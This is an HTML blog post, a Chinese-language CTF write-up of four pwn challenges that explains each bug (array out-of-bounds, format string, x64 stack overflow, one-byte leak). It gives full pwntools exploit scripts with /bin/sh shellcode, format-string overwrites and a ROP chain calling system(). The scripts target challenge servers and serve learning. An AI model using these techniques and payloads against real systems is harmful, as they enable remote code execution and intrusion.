@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ichunqiu tenCentAp - Pwn | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="第一次自己做 Pwn，真刺激。bin 和 idb：http://sh3ll.me/images/2016/07/04/ichunqiu.7z
+Pwn1在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ichunqiu tenCentAp - Pwn">
+<meta property="og:url" content="http://sh3ll.me/2016/07/04/ichunqiu-tenCentAp/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="第一次自己做 Pwn，真刺激。bin 和 idb：http://sh3ll.me/images/2016/07/04/ichunqiu.7z
+Pwn1在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。">
+<meta property="og:image" content="http://sh3ll.me/images/2016/07/04/ichunqiu-1.png">
+<meta property="og:image" content="http://sh3ll.me/images/2016/07/04/ichunqiu-2.png">
+<meta property="og:image" content="http://sh3ll.me/images/2016/07/04/ichunqiu-3.png">
+<meta property="og:image" content="http://sh3ll.me/images/2016/07/04/ichunqiu-4.png">
+<meta property="og:image" content="http://sh3ll.me/images/2016/07/04/ichunqiu-5.png">
+<meta property="og:image" content="http://sh3ll.me/images/2016/07/04/ichunqiu-6.png">
+<meta property="og:image" content="http://sh3ll.me/images/2016/07/04/ichunqiu-7.png">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ichunqiu tenCentAp - Pwn">
+<meta name="twitter:description" content="第一次自己做 Pwn，真刺激。bin 和 idb：http://sh3ll.me/images/2016/07/04/ichunqiu.7z
+Pwn1在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。">
+<meta name="twitter:image" content="http://sh3ll.me/images/2016/07/04/ichunqiu-1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-ichunqiu-tenCentAp" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ichunqiu tenCentAp - Pwn
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2016-07-04T04:56:24.000Z" itemprop="datePublished">07-04-2016</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Exploit/">Exploit</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>第一次自己做 Pwn，真刺激。bin 和 idb：<a href="/images/2016/07/04/ichunqiu.7z">http://sh3ll.me/images/2016/07/04/ichunqiu.7z</a></p>
+<h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><p>在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。<br><img src="/images/2016/07/04/ichunqiu-1.png" alt="图 1"><a id="more"></a><br><img src="/images/2016/07/04/ichunqiu-2.png" alt="图 2"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"></div><div class="line"># io = process(&quot;./tc1&quot;)</div><div class="line">io = remote(&quot;106.75.9.11&quot;, 20000)</div><div class="line"></div><div class="line"></div><div class="line">io.recvuntil(&quot;4. Divide&quot;)</div><div class="line"></div><div class="line">io.sendline(&quot;29&quot;)</div><div class="line">io.recvuntil(&quot;[123 110]&quot;)</div><div class="line">payload = p32(0x804a0a4) + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</div><div class="line">io.sendline(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<h2 id="Pwn2"><a href="#Pwn2" class="headerlink" title="Pwn2"></a>Pwn2</h2><p>格式化字符串漏洞。有几个点，开启了 ASLR，所有首先需要泄露出栈的地址；默认读取 16 字节的输入，对于 payload 是不够的，所以首先需要改写掉这个 16；程序设置了 alarm，如果直接重写返回地址的 4 个字节会超时退出，我的办法是分两次写，每次写两个字节；程序是个死循环，所以即使重写了返回地址默认也是无法去执行的，需要改写掉循环标识符使其跳出。<br><img src="/images/2016/07/04/ichunqiu-3.png" alt="图 3"><br><img src="/images/2016/07/04/ichunqiu-4.png" alt="图 4"><br><img src="/images/2016/07/04/ichunqiu-5.png" alt="图 5"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"></div><div class="line"># io = process(&quot;./echo-200&quot;)</div><div class="line">io = remote(&quot;106.75.9.11&quot;, 20001)</div><div class="line"></div><div class="line"></div><div class="line"># leak</div><div class="line">io.recv()</div><div class="line">io.sendline(&quot;%d%d%d%d %p&quot;)</div><div class="line">limit_addr = int(io.recvline().strip().split()[1], 16) - 0xc</div><div class="line">while_loop_sign = limit_addr + 0x8</div><div class="line">ret = limit_addr + 0x21c</div><div class="line">shellcode_addr = limit_addr + 0x10</div><div class="line">log.success(&quot;limit addr =&gt; &#123;&#125;&quot;.format(hex(limit_addr)))</div><div class="line">log.success(&quot;while loop sign =&gt; &#123;&#125;&quot;.format(hex(while_loop_sign)))</div><div class="line">log.success(&quot;ret =&gt; &#123;&#125;&quot;.format(hex(ret)))</div><div class="line">log.success(&quot;shellcode addr =&gt; &#123;&#125;&quot;.format(hex(shellcode_addr)))</div><div class="line"></div><div class="line"></div><div class="line"># overwrite limit</div><div class="line">io.recv()</div><div class="line">payload = p32(limit_addr) + &quot;%600d %7$n&quot;</div><div class="line">io.sendline(payload)</div><div class="line"></div><div class="line"></div><div class="line"># overwrite ret</div><div class="line">io.recv()</div><div class="line">payload = p32(ret)</div><div class="line">payload += &quot;%&#123;&#125;d %7$n&quot;.format(u16(p32(shellcode_addr)[:2]) - len(payload) - 1)</div><div class="line">io.sendline(payload)</div><div class="line">io.recv()</div><div class="line">payload = p32(ret + 0x2)</div><div class="line">payload += &quot;%&#123;&#125;d %7$n&quot;.format(u16(p32(shellcode_addr)[2:]) - len(payload) - 1)</div><div class="line">io.sendline(payload)</div><div class="line"></div><div class="line"></div><div class="line"># overwrite while loop sign and write shellcode</div><div class="line">io.recv()</div><div class="line">payload = p32(while_loop_sign)</div><div class="line">payload += &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</div><div class="line">payload += &quot;%d %7$n&quot;</div><div class="line"># gdb.attach(io, &quot;b * 0x08048FB6\nc&quot;)</div><div class="line">io.sendline(payload)</div><div class="line"></div><div class="line"></div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<h2 id="Pwn3"><a href="#Pwn3" class="headerlink" title="Pwn3"></a>Pwn3</h2><p>栈溢出，考点可能是 x64 ROP？机器是 CentOS 的，libc database 中没有找到相应的 libc，直接用的 pwntools 的 leak 泄露出 system 的偏移地址。其实这个完全可以不用泄露的，需要的技术是 return to dl_resolve，可是我还不懂，这两天要去学习下：）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line">leak.py</div><div class="line">----------</div><div class="line">from pwn import *</div><div class="line"></div><div class="line"></div><div class="line">qwb3 = ELF(&quot;./qwb3&quot;)</div><div class="line"># io = process(&quot;./qwb3&quot;)</div><div class="line">io = remote(&quot;106.75.8.230&quot;, 19286)</div><div class="line">offset = 0x48</div><div class="line"></div><div class="line">pop_rdi_ret = 0x0000000000400633</div><div class="line">pop_rsi_ret = 0x0000000000400631</div><div class="line"></div><div class="line"></div><div class="line"># leak</div><div class="line">def leak(address):</div><div class="line">	print &quot;leak &#123;&#125;&quot;.format(hex(address))</div><div class="line">	payload = &quot;A&quot; * offset</div><div class="line">	payload += p64(pop_rdi_ret)</div><div class="line">	payload += p64(1)</div><div class="line">	payload += p64(pop_rsi_ret)</div><div class="line">	payload += p64(address)</div><div class="line">	payload += &quot;A&quot; * 8</div><div class="line">	payload += p64(qwb3.plt.get(&quot;write&quot;))</div><div class="line">	payload += p64(qwb3.symbols.get(&quot;vulnerable_function&quot;))</div><div class="line">	io.sendline(payload)</div><div class="line">	# read_addr = u64(io.recv(8))</div><div class="line">	ret = io.recv(8)</div><div class="line">	io.recv()</div><div class="line">	return ret</div><div class="line"></div><div class="line">io.recvuntil(&quot;pwn pwn pwn \n&quot;)</div><div class="line">de = DynELF(leak, elf=ELF(&quot;./qwb3&quot;))</div><div class="line">system_addr = de.lookup(&quot;system&quot;, &quot;libc&quot;)</div><div class="line">write_addr = de.lookup(&quot;write&quot;, &quot;libc&quot;)</div><div class="line">print hex(system_addr)</div><div class="line">print hex(write_addr)</div><div class="line">print hex(write_addr - system_addr)</div><div class="line"></div><div class="line">exp.py</div><div class="line">----------</div><div class="line">from pwn import *</div><div class="line"></div><div class="line"></div><div class="line">qwb3 = ELF(&quot;./qwb3&quot;)</div><div class="line"># io = process(&quot;./qwb3&quot;)</div><div class="line">io = remote(&quot;106.75.8.230&quot;, 19286)</div><div class="line">offset = 0x48</div><div class="line"></div><div class="line">pop_rdi_ret = 0x0000000000400633</div><div class="line">pop_rsi_ret = 0x0000000000400631</div><div class="line"></div><div class="line"></div><div class="line"># leak</div><div class="line">io.recvuntil(&quot;pwn pwn pwn \n&quot;)</div><div class="line">payload = &quot;A&quot; * offset</div><div class="line">payload += p64(pop_rdi_ret)</div><div class="line">payload += p64(1)</div><div class="line">payload += p64(pop_rsi_ret)</div><div class="line">payload += p64(qwb3.got.get(&quot;write&quot;))</div><div class="line">payload += &quot;A&quot; * 8</div><div class="line">payload += p64(qwb3.plt.get(&quot;write&quot;))</div><div class="line">payload += p64(qwb3.symbols.get(&quot;vulnerable_function&quot;))</div><div class="line">io.sendline(payload)</div><div class="line">write_addr = u64(io.recv(8))</div><div class="line">log.success(&quot;write =&gt; &#123;&#125;&quot;.format(hex(write_addr)))</div><div class="line">system_addr = write_addr - 0x9cc20</div><div class="line">log.success(&quot;system =&gt; &#123;&#125;&quot;.format(hex(system_addr)))</div><div class="line"></div><div class="line"></div><div class="line"># write /bin/sh</div><div class="line">io.recv()</div><div class="line">payload = &quot;A&quot; * offset</div><div class="line">payload += p64(pop_rdi_ret)</div><div class="line">payload += p64(0)</div><div class="line">payload += p64(pop_rsi_ret)</div><div class="line">payload += p64(0x0000000000601048)</div><div class="line">payload += &quot;A&quot; * 8</div><div class="line">payload += p64(qwb3.plt.get(&quot;read&quot;))</div><div class="line">payload += p64(qwb3.symbols.get(&quot;vulnerable_function&quot;))</div><div class="line"># gdb.attach(io, &quot;b * vulnerable_function+31\nc&quot;)</div><div class="line">io.sendline(payload)</div><div class="line">sleep(1)</div><div class="line">io.sendline(&quot;/bin/sh\x00&quot;)</div><div class="line"></div><div class="line"></div><div class="line"># system</div><div class="line">payload = &quot;A&quot; * offset</div><div class="line">payload += p64(pop_rdi_ret)</div><div class="line">payload += p64(0x0000000000601048)</div><div class="line">payload += p64(system_addr)</div><div class="line">io.sendline(payload)</div><div class="line"></div><div class="line"></div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<h2 id="Pwn4"><a href="#Pwn4" class="headerlink" title="Pwn4"></a>Pwn4</h2><p>就是个一字节的 leak，这道题我觉得难度还不如 Pwn1…<br><img src="/images/2016/07/04/ichunqiu-6.png" alt="图 6"><br>name2 的 buf 空间为 40 字节，scanf 也是读入了 40 字节，也就是说可以去掉尾部的 “\00”，然后 name2 下方相邻的是 flag 的每一个字节，所以每次可以泄露一字节出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">from sys import argv</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line"></div><div class="line"># io = process(&quot;./cg_leak&quot;)</div><div class="line">io = remote(&quot;106.75.8.230&quot;, 13349)</div><div class="line"></div><div class="line"></div><div class="line">def leak(flag):</div><div class="line">    name = &quot;A&quot; * 40</div><div class="line">    io.recvuntil(&quot;NAME:&quot;)</div><div class="line">    io.sendline(name)</div><div class="line">    io.recvuntil(&quot;again?\n&quot;)</div><div class="line">    io.sendline(name)</div><div class="line">    io.recvuntil(&quot;FLAG: &quot;)</div><div class="line">    io.sendline(flag)</div><div class="line">    io.recvuntil(&quot;Sorry AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;)</div><div class="line">    log.success(flag[:-1] + io.recv(1))</div><div class="line">    io.close()</div><div class="line"></div><div class="line"></div><div class="line">leak(argv[1])</div></pre></td></tr></table></figure></p>
+<p><img src="/images/2016/07/04/ichunqiu-7.png" alt="图 7"></p>
+<h2 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h2><ul>
+<li>格式化字符串中利用 “%7$n” 这种 format 很方便，意思是使用第 7 个参数：<a href="http://www.freebuf.com/articles/system/74224.html" target="_blank" rel="external">格式化字符串的漏洞利用（Part 1）</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2016/07/04/ichunqiu-tenCentAp/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2016/06/28/baimao-vms/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">3 个白帽 - VMS</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2016/07/04/ichunqiu-tenCentAp/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
